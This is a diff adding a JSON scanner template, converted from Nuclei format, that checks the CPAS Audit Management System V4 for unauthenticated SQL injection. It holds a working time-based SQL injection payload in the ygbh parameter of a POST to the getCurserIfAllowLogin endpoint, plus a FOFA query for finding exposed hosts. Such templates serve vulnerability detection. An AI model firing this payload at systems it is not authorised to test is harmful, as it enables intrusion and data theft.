@@ -1,0 +1,182 @@
+{
+  "id": "cpas-managment-sqli",
+  "name": "CPAS Management System - SQL Injection",
+  "author": "s4e-io",
+  "severity": "HIGH",
+  "description": "The CPAS Audit Management System V4 has been identified with an SQL injection vulnerability in the getCurserIfAllowLogin endpoint. This flaw allows unauthenticated remote attackers to exploit the system by injecting malicious SQL queries. Through this vulnerability, attackers can retrieve sensitive data from the database and, under high-privilege circumstances, upload malicious payloads such as web shells to the server. This could potentially lead to a full compromise of the server\u0027s system. The vulnerability is triggered via a crafted HTTP POST request containing a malicious ygbh parameter, making it a critical issue that requires immediate remediation to protect the integrity of the system.\n",
+  "references": [
+    "https://github.com/wy876/POC/blob/main/%E5%8C%97%E4%BA%AC%E5%8F%8B%E6%95%B0%E8%81%9A%E7%A7%91%E6%8A%80/CPAS%E5%AE%A1%E8%AE%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FgetCurserIfAllowLogin%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
+  ],
+  "tags": [
+    "cpas",
+    "cms",
+    "sqli",
+    "time-based-sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "http(1) \u0026\u0026 http(2)",
+  "searchQueries": {
+    "fofa": "icon_hash\u003d\"-58141038\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /cpasm4/login HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(body, \"/cpasm4/mobileQRCodeController/\")"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "http_1",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "@timeout 20s\nPOST /cpasm4/cpasList/getCurserIfAllowLogin HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset\u003dUTF-8\n\nygbh\u003dq\u0027 AND (SELECT 1635 FROM (SELECT(SLEEP(7)))mlQT) AND \u0027qoYJ\u0027\u003d\u0027qoYJ\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "duration\u003e\u003d7",
+            "contains(content_type, \"text/plain\")",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "cpas-managment-sqli",
+    "info": {
+      "name": "CPAS Management System - SQL Injection",
+      "author": "s4e-io",
+      "severity": "high",
+      "description": "The CPAS Audit Management System V4 has been identified with an SQL injection vulnerability in the getCurserIfAllowLogin endpoint. This flaw allows unauthenticated remote attackers to exploit the system by injecting malicious SQL queries. Through this vulnerability, attackers can retrieve sensitive data from the database and, under high-privilege circumstances, upload malicious payloads such as web shells to the server. This could potentially lead to a full compromise of the server\u0027s system. The vulnerability is triggered via a crafted HTTP POST request containing a malicious ygbh parameter, making it a critical issue that requires immediate remediation to protect the integrity of the system.\n",
+      "reference": [
+        "https://github.com/wy876/POC/blob/main/%E5%8C%97%E4%BA%AC%E5%8F%8B%E6%95%B0%E8%81%9A%E7%A7%91%E6%8A%80/CPAS%E5%AE%A1%E8%AE%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FgetCurserIfAllowLogin%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "icon_hash\u003d\"-58141038\""
+      },
+      "tags": "cpas,cms,sqli,time-based-sqli"
+    },
+    "flow": "http(1) \u0026\u0026 http(2)",
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /cpasm4/login HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(body, \"/cpasm4/mobileQRCodeController/\")"
+            ]
+          }
+        ]
+      },
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "@timeout 20s\nPOST /cpasm4/cpasList/getCurserIfAllowLogin HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset\u003dUTF-8\n\nygbh\u003dq\u0027 AND (SELECT 1635 FROM (SELECT(SLEEP(7)))mlQT) AND \u0027qoYJ\u0027\u003d\u0027qoYJ\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "duration\u003e\u003d7",
+              "contains(content_type, \"text/plain\")",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
